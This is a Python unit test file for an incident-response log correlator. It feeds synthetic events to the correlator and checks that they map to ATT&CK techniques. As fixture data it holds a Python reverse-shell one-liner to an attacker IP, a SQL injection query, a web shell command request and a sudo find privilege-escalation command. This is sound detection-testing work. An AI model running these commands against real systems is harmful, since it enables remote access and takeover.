import unittest
import os
import tempfile
import json
from bluekit.paths import get_kb_path
from bluekit.kb.query import KB
from bluekit.ir.correlator import correlate_incident, load_events_from_files, get_nested

class TestIRFallback(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        kb_path = get_kb_path()
        cls.kb = KB(kb_path) if os.path.exists(kb_path) else None

    def test_windows_powershell(self):
        ev = {
            '@timestamp':'2026-10-05T09:01:10Z',
            'event':{'dataset':'windows.security','code':4688},
            'host':{'name':'hr-pc-01'},
            'user':{'name':'hr.anna'},
            'process':{'name':'powershell.exe','command_line':'powershell -enc SQBFAFgA...'}
        }
        # Fallback=False
        chain = correlate_incident([ev], kb=self.kb, heuristic_fallback=False)
        self.assertEqual(len(chain.stages), 0)
        
        # Fallback=True
        chain = correlate_incident([ev], kb=self.kb, heuristic_fallback=True)
        self.assertGreaterEqual(len(chain.stages), 1)
        techs = set(s.technique_id for s in chain.stages)
        self.assertIn('T1059.001', techs)
        self.assertIn('hr-pc-01', chain.hosts_involved)
        self.assertIn('hr.anna', chain.compromised_users)
        stg = next(s for s in chain.stages if s.technique_id == 'T1059.001')
        self.assertEqual(stg.status, 'SUSPECTED')

    def test_raw_nginx(self):
        content = '198.51.100.45 - - [05/Oct/2026:09:10:40 +0000] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 20 "-" "curl/7.68"'
        with tempfile.NamedTemporaryFile('w', suffix='.log', delete=False) as f:
            f.write(content)
            tmp_path = f.name
            
        try:
            evts, _ = load_events_from_files([tmp_path])
            chain = correlate_incident(evts, kb=self.kb, heuristic_fallback=True)
            self.assertGreaterEqual(len(chain.stages), 1)
            techs = set(s.technique_id for s in chain.stages)
            self.assertTrue('T1505.003' in techs or 'T1033' in techs)
            self.assertIn('198.51.100.45', chain.attacker_ips)
        finally:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)

    def test_dedup_count(self):
        ev = {
            '@timestamp':'2026-10-05T09:01:10Z',
            'event':{'dataset':'windows.security','code':4688},
            'host':{'name':'hr-pc-01'},
            'user':{'name':'hr.anna'},
            'process':{'name':'powershell.exe','command_line':'powershell -enc SQBFAFgA...'}
        }
        events = [ev] * 5
        chain = correlate_incident(events, kb=self.kb, heuristic_fallback=True)
        stgs = [s for s in chain.stages if s.technique_id == 'T1059.001']
        self.assertEqual(len(stgs), 1)
        stg = stgs[0]
        self.assertEqual(stg.iocs.get('count'), 5)
        self.assertTrue(stg.evidence.endswith(" (x5)"))

    def test_manual_rule_precedence(self):
        ev = {
            "@timestamp": "2026-09-18T10:00:00+00:00",
            "event": {"dataset": "nginx.access"},
            "host": {"name": "web-01"},
            "source": {"ip": "198.51.100.45"},
            "http": {"request": {"method": "GET"}, "response": {"status_code": 200}},
            "url": {"path": "/api/v1/products", "query": "id=1' UNION SELECT 1,2,3--"}
        }
        chain_f = correlate_incident([ev], kb=self.kb, heuristic_fallback=False)
        chain_t = correlate_incident([ev], kb=self.kb, heuristic_fallback=True)
        
        c_f = [s for s in chain_f.stages if s.technique_id == 'T1190']
        c_t = [s for s in chain_t.stages if s.technique_id == 'T1190']
        
        self.assertEqual(len(c_f), 1)
        self.assertEqual(len(c_t), 1)

    def test_regression_mock_events(self):
        mock_events = [
            {
                "@timestamp": "2026-09-18T10:00:00+00:00",
                "event": {"dataset": "nginx.access"},
                "host": {"name": "web-01"},
                "source": {"ip": "198.51.100.45"},
                "http": {"request": {"method": "GET"}, "response": {"status_code": 200}},
                "url": {"path": "/api/v1/products", "query": "id=1' UNION SELECT 1,2,3--"}
            },
            {
                "@timestamp": "2026-09-18T11:00:00+00:00",
                "event": {"dataset": "auditd.process"},
                "host": {"name": "web-01"},
                "user": {"name": "www-data"},
                "process": {"command_line": "python3 -c 'import socket,pty; s=socket.socket(); s.connect((\"198.51.100.45\", 4444)); pty.spawn(\"/bin/bash\")'"}
            },
            {
                "@timestamp": "2026-09-18T12:00:00+00:00",
                "event": {"dataset": "auditd.process"},
                "host": {"name": "web-01"},
                "user": {"name": "root"},
                "process": {"command_line": "sudo /usr/bin/find . -exec /bin/sh -p \\; -quit"}
            },
            {
                "@timestamp": "2026-09-18T13:00:00+00:00",
                "event": {"dataset": "suricata.eve"},
                "host": {"name": "web-01"},
                "message": "Suricata Alert: High Volume Outbound HTTPS POST to Rare External IP 203.0.113.88"
            },
            {
                "@timestamp": "2026-09-18T10:05:00+00:00",
                "event": {"dataset": "nginx.access"},
                "host": {"name": "web-01"},
                "http": {"response": {"status_code": 200}},
                "url": {"path": "/static/style.css"}
            }
        ]
        chain_f = correlate_incident(mock_events, kb=self.kb, heuristic_fallback=False)
        self.assertEqual(len(chain_f.stages), 4)

        chain_t = correlate_incident(mock_events, kb=self.kb, heuristic_fallback=True)
        # fallback shouldn't duplicate existing ones
        self.assertEqual(len(chain_t.stages), 4)

    def test_kb_none(self):
        ev = {
            '@timestamp':'2026-10-05T09:01:10Z',
            'event':{'dataset':'windows.security','code':4688},
            'host':{'name':'hr-pc-01'},
            'user':{'name':'hr.anna'},
            'process':{'name':'powershell.exe','command_line':'powershell -enc SQBFAFgA...'}
        }
        chain = correlate_incident([ev], kb=None, heuristic_fallback=True)
        # Should not crash and might reconstruct kb inside correlate_incident
        self.assertIsNotNone(chain)

    def test_reversed_order(self):
        ev1 = {
            '@timestamp':'2026-10-05T09:01:10Z',
            'event':{'dataset':'windows.security','code':4688},
            'host':{'name':'hr-pc-01'},
            'user':{'name':'hr.anna'},
            'process':{'name':'powershell.exe','command_line':'powershell -enc SQBFAFgA...'}
        }
        ev2 = {
            '@timestamp':'2026-10-05T09:01:12Z',
            'event':{'dataset':'windows.security','code':4688},
            'host':{'name':'hr-pc-01'},
            'user':{'name':'hr.anna'},
            'process':{'name':'powershell.exe','command_line':'powershell -enc SQBFAFgA...'}
        }
        chain_normal = correlate_incident([ev1, ev2], kb=self.kb, heuristic_fallback=True)
        chain_reversed = correlate_incident([ev2, ev1], kb=self.kb, heuristic_fallback=True)
        self.assertEqual(len(chain_normal.stages), len(chain_reversed.stages))
        
        t_n = set(s.technique_id for s in chain_normal.stages)
        t_r = set(s.technique_id for s in chain_reversed.stages)
        self.assertEqual(t_n, t_r)

    def test_get_nested(self):
        d = {'source.ip': '1.2.3.4', 'source': {'ip': '5.6.7.8'}}
        self.assertEqual(get_nested(d, 'source.ip'), '1.2.3.4')
        d2 = {'source': {'ip': '5.6.7.8'}}
        self.assertEqual(get_nested(d2, 'source.ip'), '5.6.7.8')

if __name__ == '__main__':
    unittest.main()
